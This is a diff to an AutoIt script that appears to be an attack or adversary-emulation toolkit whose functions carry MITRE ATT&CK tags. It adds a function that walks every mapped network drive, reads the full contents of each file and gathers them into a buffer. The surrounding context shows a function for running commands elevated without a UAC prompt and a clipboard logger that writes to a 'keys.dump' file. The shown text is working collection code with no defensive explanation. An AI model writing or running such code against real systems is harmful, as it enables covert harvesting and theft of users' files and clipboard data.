@@ -69,6 +69,28 @@ Func RunElevatedNoUAC($buffer = 'cd..;cd..;dir;Read-Host -Prompt "Press";');DESC
    RunWait($buffer00);
 EndFunc
 
+;DESCRIPTION:Returns stream of data from Shared Resources;MITRE:Collection
+Func SharedDiscover()
+   Local $limiter = "----------"
+   Local $buffer
+   Local $aArray = DriveGetDrive($DT_NETWORK)
+   For $i = 1 To $aArray[0]
+	  Local $aFileList = _FileListToArray($aArray[$i], "*")
+		 For $file = 1 To $aFileList[0]
+			if $aFileList[$file] <> "desktop.ini" And $aFileList[$file] <> "My Music" And $aFileList[$file] <> "My Pictures" And $aFileList[$file] <> "My Videos" Then
+				  $buffer &= $limiter &@crlf
+				  $buffer &= "Filename: " & $aFileList[$file] &@crlf
+				  Local $hFileOpen = FileOpen($aArray[$i] & "\\" & $aFileList[$file], $FO_READ)
+				  Local $sFileRead = FileRead($hFileOpen)
+				  FileClose($hFileOpen)
+				  $buffer &= $sFileRead &@crlf
+			EndIf
+		 Next
+		 $buffer &= $limiter &@crlf
+	  Next
+   Return $buffer
+EndFunc
+
 Func clipboard2Log($timeOut = 10, $pathLog = @TempDir & "\keys.dump");DESCRIPTION:Log to file the data stored in the clipboard;MITRE:Collection
    $buffer=""
    While 1
